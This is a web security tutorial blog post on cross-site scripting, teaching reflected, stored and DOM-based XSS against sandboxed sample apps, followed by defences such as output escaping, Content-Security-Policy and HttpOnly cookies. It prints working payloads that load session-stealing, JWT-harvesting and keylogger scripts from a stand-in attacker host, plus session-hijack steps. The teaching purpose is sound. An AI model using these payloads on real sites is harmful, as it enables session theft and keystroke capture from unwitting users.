---
title: Securing Web Applications, Part 3. Cross Site Scripting Attacks
date: 2016-02-29 00:00:00 Z
categories:
- Tech
author: rsillem
summary: In this post, we discuss cross site scripting attacks against web apps, and how to defend against them.
layout: default_post
---

Robin Sillem, William Ferguson

This blog post explores performing cross site scripting attacks on your own machine, on some pre-made sample web apps. The focus of this post is on securing web apps, rather than the attacks themselves. It is part of an ongoing series of blog posts on web application security, which includes:

[Securing Web Applications, Part 1. Man In The Middle Attacks](http://blog.scottlogic.com/2016/02/01/man-in-the-middle.html)

[Securing Web Applications, Part 2. SQL (and other) Injection Attacks](http://blog.scottlogic.com/2016/02/11/SQL-injection.html)

An important note before starting:

**This blog post shows how to perform an attack on a sandboxed sample website. Attacking targets without prior mutual consent is illegal. It is the reader's responsibility to obey all applicable laws. The writers of this blog post and Scott Logic assume no liability and are not responsible for any misuse or damage caused from the use of this tutorial.**

Cross site scripting (XSS)
-----

At a fundamental level, XSS (I'll use this abbreviation for cross-site scripting throughout) is simply another form of injection attack, and many of the concepts will be familiar from the previous module on SQL (and other server-side) injection. Your application passes some maliciously crafted input to an external system in a form which can damage that system. The unique feature of XSS is that the external system is the web client, using the browser to execute malicious commands.

Because XSS attacks occur on the client, there is less scope for huge one-off data breaches, so the immediate impact on the owner of the website is less severe, but on the other hand, an XSS attack will affect many more systems, which are likely to be less well secured than the servers. See [OWASP Top 10 - #3](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)) and [Cross-site Scripting](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))

What makes XSS hard to get your head around, and defend against is:

* There are lots of routes by which the malicious data can get into a browser
* There are lots of ways in which browsers execute active content
* There are lots of browsers and versions, providing different behaviours

XSS is often classified in terms of the first point above. Here's a currently accepted taxonomy:

**Reflected XSS**

1. The attacker provides the victim with some malicious data. This is often done by persuading the victim to clicking on a link, with the malicious data embedded in the URL. At this point the malicious data is still just data.
2. The victim's browser sends the malicious data to the server in a request.
3. The server embeds the malicious data in the response, typically HTML but there are other possibilities - it depends on the design of the site. The malicious data appears in the response in a place where the browser (and/or scripts running in the browser) will treat it as active content. This is the 'reflected' bit.
4. The browser renders (or otherwise processes) the response, running the malicious data as commands. The bad thing (whatever the attack was - e.g. sending user data or session IDs to the attacker) happens.

<img src="{{ site.baseurl }}/rsillem/assets/security-xss/reflected-xss.png" style="display: block; margin: auto;"/>

**Stored (aka Persisted) XSS**

1. The attacker inserts some malicious data into the server's database. This might typically be by using the normal features of the application - no additional exploit might be necessary, nor any action by the victim. Or it may be done via a different application that uses the same database. This is the 'stored' bit.
2. The victim's browser sends an entirely innocent request to the server.
3. The server embeds the malicious data in the response, typically HTML but there are other possibilities - it depends on the design of the site. The malicious data appears in the response in a place where the browser (and/or scripts running in the browser) will treat it as active content.
4. The browser renders (or otherwise processes) the response, running the malicious data as commands. The bad thing (whatever the attack was - e.g. sending user data or session IDs to the attacker) happens.

<img src="{{ site.baseurl }}/rsillem/assets/security-xss/stored-xss.png" style="display: block; margin: auto;"/>

**DOM-based XSS**

1. The attacker provides the victim with some malicious data. This is often done by persuading the victim to clicking on a link, with the malicious data embedded in the URL. At this point the malicious data is still just data.
2. Scripts running in the browser use the malicious data in client-side DOM manipulation, as part of their normal operation.
3. The browser renders (or otherwise processes) the DOM, running the malicious data as commands. The bad thing (whatever the attack was - e.g. sending user data or session IDs to the attacker) happens.

<img src="{{ site.baseurl }}/rsillem/assets/security-xss/DOM-based-xss.png" style="display: block; margin: auto;"/>


This taxonomy ([Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting)) is all about the flow of malicious data, but the picture is made more complex by the variety of ways in which you can abuse the browser - injecting script is obvious, but how about altering CSS to change how controls are presented to the user? This all gets quite deep - for an illustration of just how deep, see 

[https://channel9.msdn.com/Events/Blue-Hat-Security-Briefings/BlueHat-Security-Briefings-Fall-2012-Sessions/BH1203](https://channel9.msdn.com/Events/Blue-Hat-Security-Briefings/BlueHat-Security-Briefings-Fall-2012-Sessions/BH1203) 

for a lot of very scary information about how to build scriptless attacks using some less-well-known features of CSS and SVG amongst other things. Clearly attackers (and security researchers) know more about obscure corners of web tech than most developers.

However, the good news is that the conceptual framework we got from looking at SQL injection is equally applicable to XSS. The basic defences are:

* Know the data flows of your application - where untrusted data comes in, what constitutes valid input, how it's transformed in your application and where it goes to.
* Use automated security testing tools and code review.
* Sanitize input data, by whitelisting.
* Sanitize output data, according to the context it's going to.
* Limit the damage that can be done.

See

[XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)


The Impact
-----

So, if XSS is injected into a page, what damage can it do? Depending on the device the page is loaded on, the damage can be **severe**. An example of this is the [Browser Exploitation Framework Project](http://beefproject.com/), a penetration testing tool, which like many of these can be used maliciously. The 'benign' usage of BeEF is to navigate to the site under test, and then run a script from the browser address bar or a bookmark. This script loads a further script from the tester's location, which sets up hooks for the tester to control the target browser - that page is now a 'zombie' in a small botnet, *for testing purposes*.

In the 'malicious' usage, the attacker identifies an XSS vulnerability in the target site, then (e.g.) sends the victim a shortened URL that injects and runs the initial script via that vulnerability. The attacker now owns the victim's browser.

The BeEF project has the whole spectrum of attacks. On the lower end of the severity spectrum, it can: get your session cookie; reroute all hyperlinks to a pre-determined one; detect plugins installed; and attempt to get stored credentials (and auto-complete values) in a page. The rather alarming nature of what XSS can do starts to creep through when it can also: create a man-in-the-browser (logging every page you access); possibly change your router's admin password; take pictures through your webcam; perform social engineering in order to get your Google/Facebook/etc usernames and passwords; and potentially look through Gmail emails. The story just gets worse if the app uses PhoneGap. It can: locate you; list files on your device; list your contacts; record audio; and download files from the device -- all without the user's knowledge or approval.

Now, consider the above in relation to Stored XSS on a high-profile target. Millions of people opening the page would have that script run and would all be hooked into calls from the server. They could also have access to passwords, and mount attacks to get even more. Scared yet?

You can try this, if you have the time/inclination to set it all up, but it's not going to help you test for or prevent XSS vulnerabilities, just exploit them, and that's not what this course is about.


Real-world examples
-----

[Samy](http://motherboard.vice.com/read/the-myspace-worm-that-changed-the-internet-forever), the first big wake-up call. 

[Jira](https://www.netsparker.com/blog/web-security/apacheorg-and-jira-incident/), XSS as one link in a chain.

[Wordpress plugins](http://wptavern.com/xss-vulnerability-affects-more-than-a-dozen-popular-wordpress-plugins)


Getting Started
-----

This blog post is intended to be a hands-on discussion - at various points I'll ask you to do things to the sample applications. Obviously you don't have to - I'm not your boss - but I certainly found doing it a better way to learn than reading about it. This is a bit of a truism, but security is something of a special case, as it you need to get into the mind-set of actually trying to subvert and break your own handiwork.  

* Clone the [Sandboxed Containers Repo](https://github.com/WPFerg/SandboxedContainers) and check out the SQL_Injection branch
* Create the sample apps (and new databases) by running `vagrant up` from the sub-folders of the 'samples' folder.  There are two apps, the MEAN stack accessible at `10.10.10.10`, and Jade, Express & MySQL at `10.10.10.20`. These apps have basic user login and post making facilities, inspired by *Write Modern Web Apps with the MEAN Stack* by Jeff Dickey. There's a third site, an 'attacker site' which collects data from the other two apps at `10.10.10.30`.

Moving on from a previous article
-----

If you're moving on from a different article in this series you may want to clean up your system somewhat:

* Kill the sample app VMs with vagrant destroy.
* Recreate the sample apps (and new databases) with vagrant up. 


Session hijack via Reflected XSS
-----
Before you start this, make sure that you have the Attacker's Site example also running (at `10.10.10.30`).

**Jade\_Express\_MySQL**

We're going to use the search feature to send cookies to the attacker site. The attack payload is a pre-built hijack script on the attacker site, carefully crafted for this target system (e.g. single quotes, not double) so it doesn't upset the database query that looks for matching text in posts. You can deploy it either in the search box or the URL, but for a social-engineering assisted attack, you'd put it in the URL, and maybe obfuscate it with a URL shortener.

    <script src='//10.10.10.30/exploits/session.js'></script>

Now visit the attacker website and you'll see your session cookie has been harvested.  What's happened here is that the server has echoed back the search term verbatim to the client, which executed the harvesting script.

Fire up another browser and change your cookie to the session ID you've just harvested in your plugin of choice (EditThisCookie for Chrome, or Advanced Cookie Manager for Firefox). You've just performed a session hijack without a great deal of effort. 

<img src="{{ site.baseurl }}/rsillem/assets/security-xss/sessions.PNG" style="display: block; margin: auto;"/>


Session hijack via DOM-based XSS
-----
**MEAN_Stack**

You can do a similar thing with the MEAN_stack sample, but the technicalities are different. Since Angular gets to work after the DOM is ready, any script tags added into the body wouldn't be executed. However, this doesn't necessarily mean that all XSS has been thwarted. HTML elements have `on` attributes that execute JavaScript on a certain event. Let's craft some code that executes straight away, without the need for a script tag:

    <img src="///" onerror="alert('hello')" />

Angular is explicitly trusting the search term is safe (even though it's not safe), and binding it as-is. Normally, Angular wouldn't trust this, but it's been enabled for demonstration purposes (or you could buy the fiction that a foolish developer did it on purpose so that users could put styling tags in their posts). Now, loading in a script here is more of an ask here, but it's doable in a couple of ways:

* Perform an XMLHttpRequest, and evaluate the response; or
* Create a script element, set its source to the target URL, and append it to the `<head>` tag

The latter is easier for our purposes, so let's just do that:

    <img src="///" onerror="a = document.createElement('script'); a.src = 'http://10.10.10.30/exploits/jwt.js'; document.head.appendChild(a);" />

To hijack the session, put your attacker hat on, start the app in another browser window, open up a console and enter in,

    localStorage["ls.currentUser"] = JSON.stringify( your harvested JWT )

then refresh. That's another session hijack successfully executed.

<img src="{{ site.baseurl }}/rsillem/assets/security-xss/sessions2.PNG" style="display: block; margin: auto;"/>


Insert a keylogger via Stored XSS
-----
Let's have a look at an example of Stored XSS -- where the dangerous text is stored within the system itself. Open up the Jade example and log in. Try to create a post using some HTML (`<strong>This is bold</strong>`). It should go through fine - it's stored on the server and everyone can load this and see it. Try and make the post as ugly as possible (`<strong style="background-color: hotpink;">What a disaster</strong>`). It may assault your eyes, but isn't actually *harmful* in terms of data security.

But, what would happen if we placed a `<script>` tag in? Since it's loaded in with the rest of the page, the browser should run it just fine. Give it a try with something simple like `<script>console.log("XSS")</script>`. Again, it should go through just fine. Only this time, your code is being run every time the page is loaded, regardless of if you're signed in, or on different browsers or if the user hasn't visited the site until now. Enter in the post:

    Wow what a cool site! <script src="//10.10.10.30/exploits/keylog.js"></script>

It looks like a fairly bland and spammy post, but behind the scenes, the script tag is loaded and the attacker's script is run. Type a few characters, and fire up Dev Tools and the console should show what you've been typing. Now, open up the attacker's site and you'll see that as you type, your keystrokes are being sent to the attacker's site and are updating in real-time. **Everyone** who visits the page is vulnerable. If you've played with BeEF (see above) you may also have come across its Man-In-The-Browser command, which illustrates the fact that this keylogger attack could potentially be extended beyond the confines of the Posts page and into the Login page. Again, we're not going to do that here - we're interested in defending against the XSS vulnerability that opens the door to these attacks.

<img src="{{ site.baseurl }}/rsillem/assets/security-xss/keylogger.PNG" style="display: block; margin: auto;"/>


Review your data/command flows
-----

N.B. At first sight this section looks similar to the equivalent section in the previous post about SQL injection. It's not the same though, and the concerns are slightly different.

Before we get onto automating these attacks, let's take a look at what we're trying to defend. Specifically we should be looking at the flows of untrusted data, with special regard to untrusted data that is used in the creation of responses directly understood and rendered by the browser - e.g. HTML, CSS, JS etc., or in direct DOM manipulation in the browser. 

In the sample apps (the commits for this module), untrusted data comes from the client as posts during registration, login and the Add Post and Search features. Data from the database might also be regarded as untrusted - you don't necessarily know how it was inserted.

The external system we are concerned with in the context of XSS is the browser. In terms of built in security features, browser behaviour is complex and varies between browsers and versions. There is an excellent (if now a bit outdated) review of browser security features here: 

[https://code.google.com/p/browsersec/wiki/Main](https://code.google.com/p/browsersec/wiki/Main)

Review the whole codebase for both samples (both client and server-side code this time), looking for places where the application prepares responses to requests from the browser, or modifies the DOM directly. You will need to understand the behaviour of any client-side framework features you use - e.g. (in the Mean_stack sample) what ng-bind-html and $sce.trustAsHtml do - in order to understand how untrusted data ends up being rendered by the browser. 

This process will give you a listing of the attack surface of your application, including the fields that are relevant in the context of XSS attacks, and some idea of how to sanitize the untrusted data (see below). Consider doing the same process for the system you are working on in your day job - it'll take you much longer, of course. 


Discovering vulnerabilities with tools or by hand
-----

As with injection attacks, the actual malicious XSS payloads can be tricky to construct by hand, and things are made harder by the following considerations:

 - Browsers have many more possible input vectors than databases
 - Their behaviour varies a lot more between vendors and versions than SQL does
 - The payloads may well also have to be used in DB commands without causing them to fail

We've set up the sample apps so that  they are vulnerable to some fairly obvious attacks (though don't underestimate the time we spent getting the attacks set up). In real life it may not be so easy, but it's worth a look at the relevant bits of the OWASP testing guide.

[OWASP Testing Guide v4 Table of Contents](https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents) Sections 4.8.1, 4.8.2, 4.12.1

These come at the problem from the point of view of black-box (and grey-box) testing, but you will have the additional advantage of knowing (or being able to ask the developers) how the application works. This allows you to concentrate on the relevant bits of the app and helps you target manual attacks. As with injection attacks, the tester only really needs to demonstrate that he/she can get even trivial script to execute via XSS - that an opening exists for all the terrible exploits we have seen above. This is likely to be assisted by the same kind of fuzz testing approach used by tools for detecting injection vulnerabilities, and one of these is the free OWASP ZAP

Install and run  [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project). 

Open up the user guide from the help menu and work through the Getting Started page, including the basic penetration test. This will reveal a whole bunch of alerts, some of which may be relevant to this module.

Now try an active scan of both sample apps (at 10.10.10.10 and 10.10.10.20). This will take a few minutes, but should reveal  (in the Alerts tab) a bunch of issues, including an XSS vulnerability and the SQL injection vulnerability we already know about from the previous module. It's worth taking a closer look at what it actually found though - a Reflected XSS vulnerability in the Jade\_Express\_MySQL app only, not the stored XSS vulnerability we also know about, nor the DOM-based on on the MEAN_Stack sample. This is because of the way this tool (and similar ones like BurpSuite) work - it can operate as HTTP proxies, but in this case it is hitting known endpoints with GET and POST (as appropriate) requests with fuzz testing payloads. It doesn't know the *sequence* of requests it needs to set up the conditions to trigger the Stored XSS attack.

<img src="{{ site.baseurl }}/rsillem/assets/security-xss/zap.PNG" style="display: block; margin: auto;"/>

It also has no leverage whatsoever on the DOM-based XSS vulnerability in the MEAN_Stack sample, because that attack is entirely client-side, and doesn't involve HTTP requests. I've yet to find any good free tools for finding this kind of vulnerability (ZAP provides some very limited features which don't find the one we have). There is, however a commercial tool, [Dominator Pro](https://dominator.mindedsecurity.com/).

This shortage of tools means that you as a tester will have to do some manual testing, and so you will need to have a good understanding of how these attacks work and are constructed, and where the likely entry points to your application are. The following cheat sheet gives you a very comprehensive start:

[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)


Mitigate by sanitizing output
-----

The primary defence against XSS is sanitizing (escaping) the data your app presents to the browser. The exact nature of the sanitization depends on the kind of data you're presenting - HTML, CSS, JS all have their own escaping rules. OWASP has a [cheat sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet), a [DOM-based cheat sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet) and a [review guide](https://www.owasp.org/index.php/Reviewing_Code_for_Cross-site_scripting) to help you out with this. Rather than repeat all of the escaping rules in this document, you should look in the cheat-sheets above. 

One rule that does bear repeating is to leverage your frameworks to help you. Use a reputable and well-reviewed library, don't try to roll your own escaping code. Angular and Jade do this out of the box, and we've had to specifically enable XSS for these demos. In Angular, avoid using any `$sce.trustAs` function as much as possible -- can you really trust that string provided? If you have to use `$sce.trustAs`, can you trust your own sanitisation code? There's the [`$sanitize`](https://docs.angularjs.org/api/ngSanitize/service/$sanitize) service that attempts to sanitise a HTML string, by stripping out bad tokens such as `<script>` or `on[Event]` attributes based off of a whitelist. In Jade, try not using `!=` or `!{string}`, which doesn't escape the characters.

Find these weaknesses in the sample apps and fix them. Now try the manual and automated tests again.

For stored XSS, you really ought to not store the data in a way that could be exploited by XSS if you can help it -- prevention is better than treatment. The best way to do this, like preventing SQL Injection, is to whitelist input data -- don't store anything that doesn't fit a strict set of rules. It's important to note that this will be just one layer of the defence -- if one slipped through the net you'd still want to make sure the script injected would not get executed by the clients. The Jade example also has a few (basic) countermeasures commented out. Uncomment them and try to get around the blacklist. 

Review the previous post (injection attacks) for more about input sanitization.


Mitigate by leveraging browser security features
-----

You may wish to reset your local repo to the insecure version before your changes from the last section before proceeding.

Thankfully, browsers have some built-in security features to help mitigate this, primarily in the form of response headers.

Most browsers support the (fairly large and major) `Content-Security-Policy` HTTP header, which specifies how and if script (and other) tags should be executed -- from specific sources, inline or not. The header, in essence, is a semicolon-separated whitelist that specifies how content can be loaded from. You can specify from which domains content is able to be run from. For instance, the Jade example has the header of `script-src 'unsafe-inline' 'unsafe-eval' *`, which allows scripts to be run inline, use of the `eval` function, inline and from any domain. You can also set `img-src`, `font-src`, `connect-src`, `child-src`, `style-src` to restrict which domains can provide images, webfonts, WebSockets/XHRs, iframes, and CSS respectively. You can whitelist specific domains, `'self'`, specific inline-scripts (using hashes or nonces) or not at all. Be cautious that you allow everything you need to ‐- the console will tell you about violations. Connect‐src is useful for thick client apps (APIs etc). Inline script, styles and eval disabled by default. There is a good guide to [how CSP operates](https://scotthelme.co.uk/csp-cheat-sheet/) by Scott Helme. Browser support for CSP is good at the basic level, less so for the more advanced parts - see [http://caniuse.com/#search=csp](http://caniuse.com/#search=csp).

There's also the `X-XSS-Protection` header that can be set as well -- simply to `0` or `1`. When enabled, Chrome and Internet Explorer see the URL request contains `<script>` tags and checks for those tags in the body. If they're there, then that server is performing reflected XSS and so that script is blocked. The Jade example has this explicitly disabled for demonstration -- if the header is not present, it is enabled by default in modern browsers.

A common XSS attack is to steal session cookies. On that basis, it would be great if the server could specify to the client not to let that cookie be accessed by any Javascript. Just add `; HttpOnly` to the end of the `Set-Cookie` header (or use the HTTP Only option in a cookie framework). `document.cookie` does not contain that cookie now, so any potential XSS script attempting to access that cookie is harder to pull off. Any cookies set without using the `HttpOnly` option would still be accessible through `document.cookie`, so it's worth considering whether you can or should use it.  However, bear in mind that nothing involving cookies is fool-proof, see also
 
[What cookie attacks are possible between computers in related dns domains](http://security.stackexchange.com/questions/12412/what-cookie-attacks-are-possible-between-computers-in-related-dns-domains-exa/12419#12419)

Review the security headers used by the sample apps, and compare these with the alerts raised by OWASP ZAP. Try to secure the samples using [Helmet](https://github.com/helmetjs/helmet), then retest by hand and with ZAP.

Find out what services your framework provides for setting these headers. The following links might also come in handy - try some of these with the sample apps, then retest:

[NWebsec](https://docs.nwebsec.com/en/4.2/nwebsec/getting-started.html) for ASP.NET helps you set up all security headers in config.

[securityheaders.io](https://securityheaders.io) lets you scan any website for their security headers, and spits out a score based off of how good they are and the breakdown of exactly why it's so good or bad. 

[url-report.io](https://report-uri.io/) is similar to securityheaders.io, but also includes Public Key Pinning, a countermeasure to certificate fraud.

[CSP‐Fiddler‐Extension](https://github.com/david-risney/CSP-Fiddler-Extension) does what it says on the tin. It lets you build CSP headers for Fiddler.


Other risks and mitigations
-----

Two more related security headers:

`Content-Type`. If not set, the browser could try to sniff out what type the data is. This can be fixed by adding the header `X-Content-Type-Options: nosniff`, which will stop this from happening. Make sure that the content type is set to `application/json` if the data is indeed JSON. If set to `text/html`, injected scripts could get executed (through the special characters above).

`X-Frame-Options`. This defines how the page can be embedded in other pages, preventing clickjacking [clickjacking](https://www.owasp.org/index.php/Clickjacking) attacks - this is not XSS, but it's worth mentioning here while we're talking about security headers. `DENY` indicates that this page shouldn't be embedded, `SAMEORIGIN` indicates that only pages from the same origin can embed this page, and `ALLOW-FROM uri` whitelists the specific URIs to embed that page. [MDN's page](https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options) is pretty informative.

User education. As you have seen from the discussion above, many XSS attacks depend on a social engineering element - somehow persuading the user to click on some link which contains an attack payload. While users should (for instance) be encouraged to regard unsolicited emails with suspicion, the fact of the matter is that:

- There are many many ways of arranging for script to be run by the user.
- It's very hard for users (of all levels of technical awareness) to identify a malicious link, especially with on the one hand complex legitimate URLs and on the other hand URL shorteners.

It may be good to increase the general level of security awareness in your user base, but that is no kind of alternative to making your apps secure. 







